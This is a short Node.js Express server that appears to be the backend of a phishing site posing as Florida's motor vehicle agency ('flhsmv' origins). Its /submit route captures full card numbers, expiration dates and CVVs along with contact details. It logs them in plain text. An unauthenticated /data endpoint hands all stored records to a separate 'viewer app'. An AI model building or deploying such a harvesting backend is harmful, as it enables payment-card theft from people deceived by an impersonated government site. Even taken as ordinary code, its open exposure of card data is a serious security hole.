const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 4000;

// Define allowed origins:
const allowedOrigins = [
  "https://flhsmv-admin.vercel.app",
  "http://localhost:3000",
  "https://flhsmv.onrender.com"
];

// Setup CORS with a custom callback
app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like curl, Postman, etc.)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      // Origin is allowed
      return callback(null, true);
    } else {
      // Origin is not allowed
      return callback(new Error("Not allowed by CORS"));
    }
  }
}));

// Use the built-in JSON parser
app.use(express.json());

// In-memory storage (resets on redeploy)
let storage = [];

// POST route for submissions
app.post("/submit", (req, res) => {
  const { name, email, phone, state, message, cardNumber, expirationDate, cvv } = req.body;

  if (
    typeof cardNumber === "string" &&
    cardNumber.length === 16 &&
    typeof expirationDate === "string" &&
    typeof cvv === "string" &&
    (cvv.length === 3 || cvv.length === 4)
  ) {
    storage.push({ cardNumber, expirationDate, cvv });
    console.log("Stored Payment Info:", storage);
    return res.status(200).json({ message: "Payment data stored successfully" });
  }

  if (name && email && phone && state && message) {
    storage.push({ name, email, phone, state, message });
    console.log("Stored Contact Info:", storage);
    return res.status(200).json({ message: "Contact data stored successfully" });
  }

  return res.status(400).json({ message: "Invalid or incomplete data submitted." });
});

// GET route for viewer app to fetch all data
app.get("/data", (req, res) => {
  res.status(200).json(storage);
});

// Health check endpoint
app.get("/ping", (req, res) => {
  res.status(200).json({ message: "Viewer app connected successfully!" });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
